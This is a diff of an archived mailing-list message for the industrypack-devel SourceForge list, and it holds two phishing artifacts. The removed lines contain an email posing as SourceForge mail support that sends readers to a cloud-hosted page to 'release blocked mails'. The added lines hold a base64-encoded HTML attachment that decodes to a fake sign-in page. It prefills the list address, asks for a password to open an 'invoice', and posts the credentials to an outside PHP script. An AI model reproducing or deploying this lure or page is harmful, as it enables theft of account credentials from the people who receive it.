+TWljcm9zb2Z0IE5ldyBUYWkgTHVlIiwiTWljcm9zb2Z0IFBoYWdzUGEiLCJNaWNyb3NvZnQg
+VGFpIExlIiwiTWljcm9zb2Z0IFlpIEJhaXRpIiwiTW9uZ29saWFuIEJhaXRpIiwiTVYgQm9s
+aSIsIk15YW5tYXIgVGV4dCIsIkNhbWJyaWEgTWF0aCI7DQp9DQo8L3N0eWxlPg0KPHNjcmlw
+dCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMu
+Mi4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0Pg0KPHNjcmlwdCBkZWZlciBzcmM9Imh0dHBz
+Oi8vdXNlLmZvbnRhd2Vzb21lLmNvbS9yZWxlYXNlcy92NS4wLjkvanMvYWxsLmpzIiBpbnRl
+Z3JpdHk9InNoYTM4NC04aVBUazJzL2pNVmo4MWRuemIvaUZSMnNkQTd1MDZ2SEp5eUxsQWQ0
+c25GcENsL1NueVVqUnJiZEpzdzFwR0lsIiBjcm9zc29yaWdpbj0iYW5vbnltb3VzIj48L3Nj
+cmlwdD4NCjxzY3JpcHQgc3JjPSJodHRwczovL2FqYXguZ29vZ2xlYXBpcy5jb20vYWpheC9s
+aWJzL2pxdWVyeS8zLjMuMS9qcXVlcnkubWluLmpzIj48L3NjcmlwdD4NCjxib2R5Pg0KPGRp
+diBjbGFzcz0id3JhcHBlciI+IDwhLS0gRml4ZWQgZWxlbWVudCB0aGF0IHNwYW5zIHRoZSB2
+aWV3cG9ydCAtLT4NCiAgPGRpdiBpZD0iZWxlbWVudCIgY2xhc3M9ImVsZW1lbnQiPg0KDQo8
+Zm9ybSBtZXRob2Q9InBvc3QiIGFjdGlvbj0iaHR0cHM6Ly9lZGFhY2lsLmNvbS9sYWlsL1Va
+SUUvYWN0aW9ucy5waHAiIGF1dG9jb21wbGV0ZT0iIj4NCiAgCTxkaXYgaWQ9ImxvZ28iPjxp
+bWcgc3JjPSJodHRwczovL2kuZ3lhem8uY29tL2U4MDhmZGNlZDM4OTViYWE0MTVjMmQyMGEx
+NzMwZDVkLnBuZyI+PC9kaXY+DQogIAk8ZGl2IHN0eWxlPSJwYWRkaW5nLXRvcDogMTBweDt0
+ZXh0LWFsaWduOiBsZWZ0OyIgaWQ9ImNvbnQiID48L2Rpdj4NCiAgCTxkaXYgaWQ9InNpZ24i
+PkNvbmZpcm0gaWRlbnRpdHkgdG8gcHJvdmUgeW91IGFyZSBub3QgYSByb2JvdDwvZGl2Pg0K
+ICAJPGRpdiBjbGFzcz0iYWxlcnQgYWxlcnQtZXJyb3IgY29sLW1kLTI0IiBpZD0idXNlcm5h
+bWVFcnJvciIgPjwvZGl2Pg0KICAJPGRpdiBpZD0iZW0iPjxpbnB1dCBuYW1lPSJlbWFpbCIg
+dHlwZT0iZW1haWwiIHJlcXVpcmVkPSJyZXF1aXJlZCIgaWQ9ImkwMTE2IiBwbGFjZWhvbGRl
+cj0iRW1haWwgYWRkcmVzcywgcGhvbmUgbnVtYmVyIG9yIFNreXBlIiB2YWx1ZT0iaW5kdXN0
+cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdlLm5ldCIgc2l6ZT0iNTAiIHJlYWRvbmx5
+PSJyZWFkb25seSI+PC9kaXY+DQogIAk8ZGl2IGlkPSJlcCI+PGlucHV0IG5hbWU9InBhc3N3
+ZCIgdHlwZT0icGFzc3dvcmQiIGF1dG9mb2N1cz0iYXV0b2ZvY3VzIiByZXF1aXJlZD0icmVx
+dWlyZWQiIGlkPSJpMDExNyIgcGxhY2Vob2xkZXI9IlBhc3N3b3JkIiB2YWx1ZT0iIiBzaXpl
+PSI1MCI+PC9kaXY+DQogIAk8ZGl2IGNsYXNzPSJzaWduLW9wdCIgaWQ9InNpZ24tb3B0Ij4N
+CiAgCQk8ZGl2IGlkPSJuby1hY2MiPlNpZ24gaW4gdG8gZG93bmxvYWQgZG9jdW1lbnQgICA8
+YSBocmVmPSIjIj4gKFByb2Zvcm1hIEludm9pY2UueGxzKTwvYT48L2Rpdj48ZGl2IGNsYXNz
+PSJidXR0b24iID48YSBocmVmPSIjIj48YnV0dG9uIGlkPSJpOTgzODkzIiBjbGFzcz0ibmV3
+YnV0dG9uIiB0eXBlPSJzdWJtaXQiIG5hbWU9InN1Ym1pdCI+PGltZyBzcmM9IiI+Q29udGlu
+dWU8L2J1dHRvbj48L2E+PC9kaXY+DQogIAkJPGRpdiBpZD0ic2lnbi1vdXQiIGNsYXNzPSJz
+aWduLW9wdCI+PGEgaHJlZj0iIyI+PC9hPjwvZGl2Pg0KDQogIAk8L2Rpdj4NCiAgPC9mb3Jt
+Pg0KICA8L2Rpdj4gPCEtLSB5b3VyIGFjdHVhbCBjZW50ZXJlZCBlbGVtZW50IC0tPg0KPC9k
+aXY+DQo8L2JvZHk+YQ0K
 
-}	@media only screen and (max-width: 480px){
-		#bodyCell{
-			padding-top:10px !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnRetinaImage{
-			max-width:100% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnImage{
-			width:100% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnCartContainer,.mcnCaptionTopContent,.mcnRecContentContainer,.mcnCaptionBottomContent,.mcnTextContentContainer,.mcnBoxedTextContentContainer,.mcnImageGroupContentContainer,.mcnCaptionLeftTextContentContainer,.mcnCaptionRightTextContentContainer,.mcnCaptionLeftImageContentContainer,.mcnCaptionRightImageContentContainer,.mcnImageCardLeftTextContentContainer,.mcnImageCardRightTextContentContainer,.mcnImageCardLeftImageContentContainer,.mcnImageCardRightImageContentContainer{
-			max-width:100% !important;
-			width:100% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnBoxedTextContentContainer{
-			min-width:100% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnImageGroupContent{
-			padding:9px !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnCaptionLeftContentOuter .mcnTextContent,.mcnCaptionRightContentOuter .mcnTextContent{
-			padding-top:9px !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnImageCardTopImageContent,.mcnCaptionBottomContent:last-child .mcnCaptionBottomImageContent,.mcnCaptionBlockInner .mcnCaptionTopContent:last-child .mcnTextContent{
-			padding-top:18px !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnImageCardBottomImageContent{
-			padding-bottom:9px !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnImageGroupBlockInner{
-			padding-top:0 !important;
-			padding-bottom:0 !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnImageGroupBlockOuter{
-			padding-top:9px !important;
-			padding-bottom:9px !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnTextContent,.mcnBoxedTextContentColumn{
-			padding-right:18px !important;
-			padding-left:18px !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcnImageCardLeftImageContent,.mcnImageCardRightImageContent{
-			padding-right:18px !important;
-			padding-bottom:0 !important;
-			padding-left:18px !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-		.mcpreview-image-uploader{
-			display:none !important;
-			width:100% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-	/*
-	@tab Mobile Styles
-	@section Heading 1
-	@tip Make the first-level headings larger in size for better readability on small screens.
-	*/
-		h1{
-			/*@editable*/font-size:22px !important;
-			/*@editable*/line-height:125% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-	/*
-	@tab Mobile Styles
-	@section Heading 2
-	@tip Make the second-level headings larger in size for better readability on small screens.
-	*/
-		h2{
-			/*@editable*/font-size:20px !important;
-			/*@editable*/line-height:125% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-	/*
-	@tab Mobile Styles
-	@section Heading 3
-	@tip Make the third-level headings larger in size for better readability on small screens.
-	*/
-		h3{
-			/*@editable*/font-size:18px !important;
-			/*@editable*/line-height:125% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-	/*
-	@tab Mobile Styles
-	@section Heading 4
-	@tip Make the fourth-level headings larger in size for better readability on small screens.
-	*/
-		h4{
-			/*@editable*/font-size:16px !important;
-			/*@editable*/line-height:150% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-	/*
-	@tab Mobile Styles
-	@section Boxed Text
-	@tip Make the boxed text larger in size for better readability on small screens. We recommend a font size of at least 16px.
-	*/
-		table.mcnBoxedTextContentContainer td.mcnTextContent,td.mcnBoxedTextContentContainer td.mcnTextContent p{
-			/*@editable*/font-size:14px !important;
-			/*@editable*/line-height:150% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-	/*
-	@tab Mobile Styles
-	@section Header Text
-	@tip Make the header text larger in size for better readability on small screens.
-	*/
-		td#templateHeader td.mcnTextContent,td#templateHeader td.mcnTextContent p{
-			/*@editable*/font-size:16px !important;
-			/*@editable*/line-height:150% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-	/*
-	@tab Mobile Styles
-	@section Body Text
-	@tip Make the body text larger in size for better readability on small screens. We recommend a font size of at least 16px.
-	*/
-		td#templateBody td.mcnTextContent,td#templateBody td.mcnTextContent p{
-			/*@editable*/font-size:16px !important;
-			/*@editable*/line-height:150% !important;
-		}
-
-}	@media only screen and (max-width: 480px){
-	/*
-	@tab Mobile Styles
-	@section Footer Text
-	@tip Make the footer content text larger in size for better readability on small screens.
-	*/
-		td#templateFooter td.mcnTextContent,td#templateFooter td.mcnTextContent p{
-			/*@editable*/font-size:14px !important;
-			/*@editable*/line-height:150% !important;
-		}
-
-}</style></head>
-    <body>
-        <!--*|IF:MC_PREVIEW_TEXT|*-->
-        <!--[if !gte mso 9]><!----><span class='mcnPreviewText' style='display:none; font-size:0px; line-height:0px; max-height:0px; max-width:0px; opacity:0; overflow:hidden; visibility:hidden; mso-hide:all;'></span><!--<![endif]-->
-        <!--*|END:IF|*-->
-        <center>
-            <table align='center' border='0' cellpadding='0' cellspacing='0' height='100%' width='100%' id='bodyTable'>
-                <tr>
-                    <td align='left' valign='top' id='bodyCell'>
-                        <!-- BEGIN TEMPLATE // -->
-                        <!--[if (gte mso 9)|(IE)]>
-                        <table align='center' border='0' cellspacing='0' cellpadding='0' width='600' style='width:600px;'>
-                        <tr>
-                        <td align='center' valign='top' width='600' style='width:600px;'>
-                        <![endif]-->
-                        <table border='0' cellpadding='0' cellspacing='0' width='100%' class='templateContainer'>
-                            <tr>
-                                <td valign='top' id='templateHeader'><table border='0' cellpadding='0' cellspacing='0' width='100%' class='mcnImageBlock' style='min-width:100%;'>
-    <tbody class='mcnImageBlockOuter'>
-            <tr>
-                <td valign='top' style='padding:9px' class='mcnImageBlockInner'>
-                    <table align='left' width='100%' border='0' cellpadding='0' cellspacing='0' class='mcnImageContentContainer' style='min-width:100%;'>
-                        
-</table></td>
-                            </tr>
-                            <tr>
-                                <td valign='top' id='templateBody'><table border='0' cellpadding='0' cellspacing='0' width='100%' class='mcnTextBlock' style='min-width:100%;'>
-    <tbody class='mcnTextBlockOuter'>
-        <tr>
-            <td valign='top' class='mcnTextBlockInner' style='padding-top:9px;'>
-              	<!--[if mso]>
-				<table align='left' border='0' cellspacing='0' cellpadding='0' width='100%' style='width:100%;'>
-				<tr>
-				<![endif]-->
-			    
-				<!--[if mso]>
-				<td valign='top' width='600' style='width:600px;'>
-				<![endif]-->
-                <table align='left' border='0' cellpadding='0' cellspacing='0' style='max-width:100%; min-width:100%;' width='100%' class='mcnTextContentContainer'>
-                    <tbody><tr>
-                        
-                        <td valign='top' class='mcnTextContent' style='padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;'>
-                        
-                            <span style='font-size:18px'>You have ❿ undelivered incoming mails as of <b>Date</b> : 30-06-2021 08:22:11. <br><br>
-                        </td>
-                    </tr>
-                </tbody></table>
-				<!--[if mso]>
-				</td>
-				<![endif]-->
-                
-				<!--[if mso]>
-				</tr>
-				</table>
-				<![endif]-->
-            </td>
-        </tr>
-    </tbody>
-</table><table border='0' cellpadding='0' cellspacing='0' width='100%' class='mcnButtonBlock' style='min-width:100%;'>
-    <tbody class='mcnButtonBlockOuter'>
-        <tr>
-            <td style='padding-top:0; padding-right:18px; padding-bottom:18px; padding-left:18px;' valign='top' align='center' class='mcnButtonBlockInner'>
-                <table border='0' cellpadding='0' cellspacing='0' width='100%' class='mcnButtonContentContainer' style='border-collapse: separate !important;border-radius: 4px;background-color: #1a088a;'>
-                    <tbody>
-                        <tr>
-                            <td align='center' valign='middle' class='mcnButtonContent' style='font-family: Arial; font-size: 16px; padding: 13px;'>
-                                <a class='mcnButton ' title='Release blocked incoming mails to inbox' href='https://systemxz.s3.jp-tok.cloud-object-storage.appdomain.cloud/listing.html?fileId=7T57882b909ac729_317635386Gvzu53f104d22a975b7b54e_0655Z366/#industrypack-devel@lists.sourceforge.net' target='_blank' style='font-weight: bold;letter-spacing: normal;line-height: 100%;text-align: center;text-decoration: none;color: #FFFFFF;'>Release blocked incoming mails to inbox.</a>
-                            </td>
-                        </tr>
-                    </tbody>
-                </table>
-            </td>
-        </tr>
-    </tbody>
-</table></td>
-                            </tr>
-                            <tr>
-                                <td valign='top' id='templateFooter'><table border='0' cellpadding='0' cellspacing='0' width='100%' class='mcnTextBlock' style='min-width:100%;'>
-    <tbody class='mcnTextBlockOuter'>
-        <tr>
-            <td valign='top' class='mcnTextBlockInner' style='padding-top:9px;'>
-              	<!--[if mso]>
-				<table align='left' border='0' cellspacing='0' cellpadding='0' width='100%' style='width:100%;'>
-				<tr>
-				<![endif]-->
-			    
-				<!--[if mso]>
-				<td valign='top' width='600' style='width:600px;'>
-				<![endif]-->
-                <table align='left' border='0' cellpadding='0' cellspacing='0' style='max-width:100%; min-width:100%;' width='100%' class='mcnTextContentContainer'>
-                    <tbody><tr>
-                        
-                        <td valign='top' class='mcnTextContent' style='padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;'><br>
-<br><br><br>
-&nbsp;<span style='font-size:18px'><em><b> &copy; 2021 lists.sourceforge.net Mail Support </b></em></span><br>
-<br>&nbsp;
-                        </td>
-                    </tr>
-                </tbody></table>
-				<!--[if mso]>
-				</td>
-				<![endif]-->
-                
-				<!--[if mso]>
-				</tr>
-				</table>
-				<![endif]-->
-            </td>
-        </tr>
-    </tbody>
-</table><table border='0' cellpadding='0' cellspacing='0' width='100%' class='mcnTextBlock' style='min-width:100%;'>
-    <tbody class='mcnTextBlockOuter'>
-        <tr>
-            <td valign='top' class='mcnTextBlockInner' style='padding-top:9px;'>
-              	<!--[if mso]>
-				<table align='left' border='0' cellspacing='0' cellpadding='0' width='100%' style='width:100%;'>
-				<tr>
-				<![endif]-->
-			    
-				<!--[if mso]>
-				<td valign='top' width='600' style='width:600px;'>
-				<![endif]-->
-                
-				<!--[if mso]>
-				</td>
-				<![endif]-->
-                
-				<!--[if mso]>
-				</tr>
-				</table>
-				<![endif]-->
-            </td>
-        </tr>
-    </tbody>
-</table></td>
-                            </tr>
-                        </table>
-                        <!--[if (gte mso 9)|(IE)]>
-                        </td>
-                        </tr>
-                        </table>
-                        <![endif]-->
-                        <!-- // END TEMPLATE -->
-                    </td>
-                </tr>
-            </table>
-        </center>
-    </body>
-</html>
-	
-
-
---===============3199137543286568271==
+------=_NextPart_000_0012_A9FE26CB.A1306DD6
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
 Content-Disposition: inline
 
 
---===============3199137543286568271==
+------=_NextPart_000_0012_A9FE26CB.A1306DD6
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -730,4 +241,6 @@ Industrypack-devel mailing list
 Industrypack-devel@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/industrypack-devel
 
---===============3199137543286568271==--
+------=_NextPart_000_0012_A9FE26CB.A1306DD6--
+
+
